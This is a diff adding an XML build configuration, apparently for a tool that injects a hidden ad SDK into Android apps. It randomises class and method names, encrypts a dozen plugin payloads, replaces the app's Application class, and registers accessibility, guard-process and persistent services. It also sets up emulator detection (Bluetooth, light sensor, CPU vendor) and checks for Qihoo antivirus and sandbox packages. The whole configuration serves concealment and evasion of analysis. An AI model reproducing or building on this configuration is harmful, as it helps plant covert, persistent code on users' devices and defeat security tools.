@@ -1,0 +1,351 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<Config>
+	<Setup Name="Setup">
+		<Source Name="SdkApplication" Value="com.${@config\\rand\\component}.${@config\\rand\\component|#up=1}${#rand|#min=2|#max=3}"/>
+		<Source Name="StartPanSdk" Value="com.${@config\\rand\\component}.${@config\\rand\\plugin}.${@config\\rand\\component|#up=1}"/>
+		<Source Name="SdkPanDecode" Value="com.${@config\\rand\\plugin}.${@config\\rand\\component}.${@config\\rand\\plugin|#up=1}"/>
+		<Source Name="FileOp" Value="com.${@config\\rand\\plugin}.${@config\\rand\\rand1}.${@config\\rand\\plugin|#up=1}"/>
+		<Source Name="CheckUtil" Value="com.${@config\\rand\\plugin}.${@config\\rand\\rand1}.${@config\\rand\\plugin|#up=1}"/>
+
+		<Source Name="Decode1Method" Value="${@config\\rand\\rand1|#unique=Method}"/>
+		<Source Name="Release1Method" Value="${@config\\rand\\rand2|#unique=Method}"/>
+		<Source Name="GetEntryClassMethod" Value="${@config\\rand\\rand3|#unique=Method}"/>
+		<Source Name="GetFileTargetMethod" Value="${@config\\rand\\rand4|#unique=Method}"/>
+		<Source Name="DeleteDirectory1Method" Value="${@config\\rand\\rand5|#unique=Method}"/>
+		<Source Name="DecodeFileMethod" Value="${@config\\rand\\rand1|#unique=Method}"/>
+		<Source Name="BaseStrMethod" Value="${@config\\rand\\rand2|#unique=Method}"/>
+		<Source Name="DeleteDirectory1Method" Value="${@config\\rand\\rand3|#unique=Method}"/>
+		<Source Name="CreateFileTemp2Method" Value="${@config\\rand\\rand4|#unique=Method}"/>
+		<Source Name="GetCurrentProcessNameMethod" Value="${@config\\rand\\rand5|#unique=Method}"/>
+		<Source Name="GetRandomFolderMethod" Value="${@config\\rand\\rand1|#unique=Method}"/>
+		<Source Name="GetJarName2Method" Value="${@config\\rand\\rand2|#unique=Method}"/>
+		<Source Name="InvokeCheckMethod" Value="${@config\\rand\\rand3|#unique=Method}"/>
+		<Source Name="IsVirtualMethod" Value="${@config\\rand\\rand4|#unique=Method}"/>
+		<Source Name="NotHasBlueTooth1Method" Value="${@config\\rand\\rand5|#unique=Method}"/>
+		<Source Name="NotHasLightSensorManagerMethod" Value="${@config\\rand\\rand1|#unique=Method}"/>
+		<Source Name="IsNonRoutineCpuMethod" Value="${@config\\rand\\rand2|#unique=Method}"/>
+		<Source Name="ReadCpuInfoMethod" Value="${@config\\rand\\rand3|#unique=Method}"/>
+		<Source Name="GetCodeByteMethod" Value="${@config\\rand\\rand4|#unique=Method}"/>
+
+		<Source Name="PluginMask" Value="${#rand|#min=3|#max=6}"/>
+		<Source Name="web" Value="${#rand|#min=5|#max=12}"/>
+		<Source Name="dsp" Value="${#rand|#min=3|#max=10}"/>
+		<Source Name="live" Value="${@config\\rand\\plugin}"/>
+		<Source Name="appleid" Value="${#rand|#min=4|#max=10}"/>
+		<Source Name="AZeroPlug" Value="${#rand|#min=5|#max=7}"/>
+		<Source Name="IFirstPlug" Value="${#rand|#min=4|#max=8}"/>
+		<Source Name="LSecondPlug" Value="${#rand|#min=5|#max=8}"/>
+		<Source Name="NThreePlug" Value="${#rand|#min=4|#max=7}"/>
+		<Source Name="CFivePlug" Value="${#rand|#min=4|#max=7}"/>
+		<Source Name="FSixPlug" Value="${#rand|#min=4|#max=9}"/>
+		<Source Name="VEightPlug" Value="${#rand|#min=5|#max=8}"/>
+		<Source Name="TNinePlug" Value="${#rand|#min=4|#max=7}"/>
+		<Source Name="BTenPlug" Value="${#rand|#min=4|#max=9}"/>
+		<Source Name="MElevenPlug" Value="${#rand|#min=5|#max=9}"/>
+		<Source Name="PTwelvePlug" Value="${#rand|#min=4|#max=9}"/>
+		<Source Name="AThirteenPlug" Value="${#rand|#min=4|#max=9}"/>
+
+		<Source Name="ForeignCount" Value="${@config\\rand\\plugin}"/>
+		<Source Name="PluginsDir" Value="${@config\\rand\\rand1}"/>
+		<Source Name="PluginFile" Value="${@config\\rand\\rand2}"/>
+		<Source Name="DownloadDB" Value="${@config\\rand\\rand3}"/>
+		<Source Name="NowData" Value="${@config\\rand\\rand5}"/>
+		<Source Name="ApiInfo" Value="${@config\\rand\\rand4}"/>
+		<Source Name="PathChange" Value="${@config\\rand\\rand4}"/>
+
+		<Source Name="XNJ" Value="${#rand|#min=5|#max=9}"/>
+		<Source Name="VirtualEnc" Value="${#rand|#min=5|#max=9}"/>
+		<Source Name="DataEnc" Value="${#rand|#min=5|#max=9}"/>
+		<Source Name="OptEnc" Value="${#rand|#min=5|#max=9}"/>
+		<Source Name="UserEnc" Value="${#rand|#min=5|#max=9}"/>
+		<Source Name="Mob" Value="${#rand|#min=5|#max=9}"/>
+		<Source Name="VirName" Value="${#rand|#min=5|#max=9}"/>
+
+		<Source Name="AuthenXmlRes" Value="${#rand|#min=5|#max=9}"/>
+		<Source Name="SyncXmlRes" Value="${#rand|#min=5|#max=9}"/>
+
+		<Source Name="AuthenXmlResFile" Value="res/xml/${%AuthenXmlRes}.xml"/>
+		<Source Name="SyncXmlResFile" Value="res/xml/${%SyncXmlRes}.xml"/>
+
+		<Source Name="AuthenXmlResMani" Value="@xml/${%AuthenXmlRes}"/>
+		<Source Name="SyncXmlResMani" Value="@xml/${%SyncXmlRes}"/>
+
+	</Setup>
+
+	<ConfigRunInfo Name="AddParameter" Lazy=""
+		NoUpperageLimit="true"
+		NativeCheck="com.qihoo.antivirus;com.qihoo.androidsandbox"
+		NativeCheckType="1"
+		NoToShell="true"
+
+		Label4="ConfigNativePath"
+		Label6="com.sdk.entry.SdkEntry"
+		Label7="startLoad"
+		Label8="/proc/%d/cmdline"
+		Jar=".jar"
+		Dex=".dex"
+		Label9="android.app.ActivityThread"
+		Label10="currentProcessName"
+		Label11="loadAttachContext"
+		Label20="android.bluetooth.BluetoothAdapter"
+		Label21="getDefaultAdapter"
+		Label22="getName"
+		Label24="getSystemService"
+		Label25="android.hardware.SensorManager"
+		Label26="intel"
+		Label27="amd"
+		Label28="/system/bin/cat"
+		Label29="/proc/cpuinfo"
+		Label30="sensor"
+		Label31="getDefaultSensor"
+	/>
+
+	<EditConfig IsPre="true" Name="AddMapping"
+		SdkPlace="BackgroundService"
+		SdkClass="com.omgSdk.andoclib.Admob"
+		SdkMethod="init"
+		CanWorkCheck="false"
+		sdks="1"
+		IsPreInstall="true"
+		NewRequestInterface="true"
+		NewSecurity="true"
+		UseNewNativeLoader="true"
+		AutoPop="20000"
+
+		LaunchOne="true"
+		PluginMask="KOPPSJs"
+		NativeMask="mklkgg"
+
+		NicroTestMode="false"
+		NicroRun="true"
+		NewAction="false"
+		PMask="179"
+		sdkVersion="11020"
+		SdkVersion="1025"
+		VersionCode="11026"
+		UseGuardProcess="true"
+		MultiPackage="true"
+		SdkMode=""
+		IsPersistent="true"
+		PlatformType="online-nicro"
+		If.ServiceMode="true"
+		If.dsp="true"
+
+		live="Tlive"
+		Shield_appleid="true"
+
+		appleid="appleid"
+		AZeroPlug="AZeroPlug"
+		IFirstPlug="IFirstPlug"
+		LSecondPlug="LSecondPlug"
+		NThreePlug="NThreePlug"
+		CFivePlug="CFivePlug"
+		FSixPlug="FSixPlug"
+		VEightPlug="VEightPlug"
+		TNinePlug="TNinePlug"
+		BTenPlug="BTenPlug"
+		MElevenPlug="MElevenPlug"
+		PTwelvePlug="PTwelvePlug"
+		AThirteenPlug="AThirteenPlug"
+
+		ForeignCount="ForeignCount"
+		PluginsDir="PluginsDir"
+		PluginFile="PluginFile"
+		DownloadDB="DownloadDB"
+		NowData="NowData"
+		ApiInfo="apiInfo"
+		PathChange="path_change"
+
+		XNJ="XNJ"
+		VirtualEnc="virtual"
+		DataEnc="data"
+		OptEnc="opt"
+		UserEnc="user"
+		Mob="Mob"
+
+		VirName=""
+	>
+	</EditConfig>
+
+	<EditCompMapping IsPre="true" Name="AddCompMapping"
+		NActivity="com.view.sdk.NActivity"
+		HolderActivity="com.view.sdk.AdsHolderActivity"
+		BackgroundService="com.omgSdk.outport.BackgroundService"
+		LiveService="com.omgSdk.outport.LiveService"
+		CommonService="com.omg.services.CommonService"
+		CommonActivity="com.omg.outport.CommonActivity"
+		SdkCommonReceiver="com.omg.services.SdkCommonReceiver"
+		AutoAccessibilityService="com.omgSdk.andoclib.AutoAccessibilityService"
+		SdkNotificationService="com.view.sdk.action.SdkNotificationService"
+		ScheduleService="sdk.nicro.lu.ScheduleService"
+		WebService="sdk.nicro.lu.ProcessService"
+		DspService="sdk.nicro.lu.ProcessService"
+		DspActivity="sdk.nicro.lu.ps.PluginActivity"
+		InnerActivity="sdk.nicro.lu.ps.PluginActivity"
+		InnerService="sdk.nicro.lu.ProcessService"
+
+		LiveJobService="com.omgSdk.commen.LiveJobService"
+		AuthenticationService="com.omgSdk.commen.AuthenticationService"
+		SyncService="com.omgSdk.commen.SyncService"
+
+	/>
+
+	<EditManifest IsPre="true" Name="AndroidManifest.xml" />
+
+	<EditSdkCode Name="FastSdkApplication"
+		ClassName="com.dmy.FastSdkApplication"
+		Class.SdkPanDecode="com.dmy.SdkPanDecode"
+		Class.FileOp="com.dmy.FileOp"
+		Class.StartPanSdk="com.dmy.StartPanSdk"
+		Class.CheckUtil="com.dmy.CheckUtil"
+
+		Pattern.StartMethod="loadInnerSdk"
+		Pattern.Decode1Method="\$decode1"
+		Pattern.Release1Method="\$release1"
+		Pattern.GetEntryClassMethod="getEntryClass"
+		Pattern.GetFileTargetMethod="getFileTarget"
+		Pattern.DeleteDirectory1Method="deleteDirectory1"
+		Pattern.IsVirtualMethod="isVirtual"
+		Pattern.InvokeCheckMethod="invokeCheckMethod"
+
+		OSB.Label6="com.sdk.entry.SdkEntry"
+		OSB.Label7="startLoad"
+		OSB.Label11="loadAttachContext"
+		OSB.PluginConfig="PluginConfig"
+		OSBKey=""
+
+		ReplaceApplication="true">
+
+	</EditSdkCode>
+
+	<EditSdkCode Name="StartPanSdk"
+		ClassName="com.dmy.StartPanSdk"
+		TargetName="StartPanSdk"
+
+		Pattern.DecodeFileMethod="decodeFile"
+		Pattern.BaseStrMethod="baseStr"
+		Pattern.Decode1Method="\$decode1"
+		Pattern.GetCodeByteMethod="getCodeByte"
+
+		OSB.Label6="com.sdk.entry.SdkEntry"
+		OSB.Label7="startLoad"
+		OSB.PluginConfig="PluginConfig"
+		OSBKey=""
+	>
+	</EditSdkCode>
+
+	<EditSdkCode Name="SdkPanDecode"
+		ClassName="com.dmy.SdkPanDecode"
+		TargetName="SdkPanDecode"
+		Class.StartPanSdk="com.dmy.StartPanSdk"
+		Class.CheckUtil="com.dmy.CheckUtil"
+
+		Pattern.DeleteDirectory1Method="deleteDirectory1"
+		Pattern.CreateFileTemp2Method="createFileTemp2"
+		Pattern.GetCurrentProcessNameMethod="getCurrentProcessName"
+		Pattern.Decode1Method="\$decode1"
+		Pattern.InvokeCheckMethod="invokeCheckMethod"
+
+		OSB.Label9="android.app.ActivityThread"
+		OSB.Label10="currentProcessName"
+		OSBKey="">
+	</EditSdkCode>
+
+	<EditSdkCode Name="FileOp"
+		ClassName="com.dmy.FileOp"
+		TargetName="FileOp"
+		Class.SdkPanDecode="com.dmy.SdkPanDecode"
+		Class.StartPanSdk="com.dmy.StartPanSdk"
+
+		Pattern.Release1Method="\$release1"
+		Pattern.GetRandomFolderMethod="getRandomFolder"
+		Pattern.GetJarName2Method="getJarName2"
+		Pattern.Decode1Method="\$decode1"
+		Pattern.CreateFileTemp2Method="createFileTemp2"
+		Pattern.DecodeFileMethod="decodeFile"
+		Pattern.GetCurrentProcessNameMethod="getCurrentProcessName"
+
+		OSB.AssetName="AssetName"
+		OSB.Jar="\.jar"
+		OSBKey="">
+	</EditSdkCode>
+
+	<EditSdkCode Name="CheckUtil"
+		ClassName="com.dmy.CheckUtil"
+		TargetName="CheckUtil"
+		Class.StartPanSdk="com.dmy.StartPanSdk"
+
+		Pattern.InvokeCheckMethod="invokeCheckMethod"
+		Pattern.IsVirtualMethod="isVirtual"
+		Pattern.NotHasBlueTooth1Method="notHasBlueTooth1"
+		Pattern.NotHasLightSensorManagerMethod="notHasLightSensorManager"
+		Pattern.IsNonRoutineCpuMethod="isNonRoutineCpu"
+		Pattern.ReadCpuInfoMethod="readCpuInfo"
+		Pattern.Decode1Method="\$decode1"
+
+		OSB.Label20="android.bluetooth.BluetoothAdapter"
+		OSB.Label21="getDefaultAdapter"
+		OSB.Label22="getName"
+		OSB.Label24="getSystemService"
+		OSB.Label25="android.hardware.SensorManager"
+		OSB.Label26="intel"
+		OSB.Label27="amd"
+		OSB.Label28="/system/bin/cat"
+		OSB.Label29="/proc/cpuinfo"
+		OSB.Label30="sensor"
+		OSB.Label31="getDefaultSensor"
+		OSBKey="">
+	</EditSdkCode>
+
+	<WriteConfig Name="assets/pc.cg" UseConfig="true"/>
+
+
+	<Encrypt Name="assets/appleid" MoveName="appleid"
+		Cmd="java -jar bin\classes.jar encrypt $(src) $(tar) 379" />
+
+	<Encrypt Name="assets/AZeroPlug" MoveName="AZeroPlug"
+		Cmd="java -jar bin\classes.jar encrypt $(src) $(tar) 379" />
+	<Encrypt Name="assets/IFirstPlug" MoveName="IFirstPlug"
+		Cmd="java -jar bin\classes.jar encrypt $(src) $(tar) 379" />
+	<Encrypt Name="assets/LSecondPlug" MoveName="LSecondPlug"
+		Cmd="java -jar bin\classes.jar encrypt $(src) $(tar) 379" />
+	<Encrypt Name="assets/NThreePlug" MoveName="NThreePlug"
+		Cmd="java -jar bin\classes.jar encrypt $(src) $(tar) 379" />
+	<Encrypt Name="assets/CFivePlug" MoveName="CFivePlug"
+		Cmd="java -jar bin\classes.jar encrypt $(src) $(tar) 379" />
+	<Encrypt Name="assets/FSixPlug" MoveName="FSixPlug"
+		Cmd="java -jar bin\classes.jar encrypt $(src) $(tar) 379" />
+	<Encrypt Name="assets/VEightPlug" MoveName="VEightPlug"
+		Cmd="java -jar bin\classes.jar encrypt $(src) $(tar) 379" />
+	<Encrypt Name="assets/TNinePlug" MoveName="TNinePlug"
+		Cmd="java -jar bin\classes.jar encrypt $(src) $(tar) 379" />
+	<Encrypt Name="assets/BTenPlug" MoveName="BTenPlug"
+		Cmd="java -jar bin\classes.jar encrypt $(src) $(tar) 379" />
+	<Encrypt Name="assets/MElevenPlug" MoveName="MElevenPlug"
+		Cmd="java -jar bin\classes.jar encrypt $(src) $(tar) 379" />
+
+	<FileCopy Name="assets/ugsdk" IfName="umKey" MoveName="UmengSdk"/>
+	<FileCopy Name="res/xml/accountauthenticator.xml"  MoveName="AuthenXmlResFile" Target="res"/>
+	<FileCopy Name="res/xml/sync_adapter.xml"  MoveName="SyncXmlResFile" Target="res"/>
+	<FileCopy Name="apk:///assets/lib/virName" MoveName="VirName" DirName="assets/lib"/>
+
+	<Encrypt Name="assets/Tlive" MoveName="live">
+		<Cmd Line="java -jar bin\\filesecurity.jar enc key $(src) $(tar) $get('PluginMask')"/>
+	</Encrypt>
+
+	<Encrypt Name="assets/core" MoveName="AssetName">
+		<Cmd Line="java -jar bin\\classes.jar enc_num $(src) $(tar)"/>
+	</Encrypt>
+
+	<Encrypt Name="assets/web" MoveName="web" IfName="web">
+		<Cmd Line="java -jar bin\filesecurity.jar encrypt $(src) $(tar) 179"/>
+	</Encrypt>
+
+	<Encrypt Name="assets/dsp" MoveName="dsp" IfName="dsp">
+		<Cmd Line="java -jar bin\filesecurity.jar encrypt $(src) $(tar) 179"/>
+	</Encrypt>
+
+	<WriteRunInfo Name="assets/rm" MoveName="FileName" MixLaunchNative="true" NewNative="true"/>
+
+</Config>
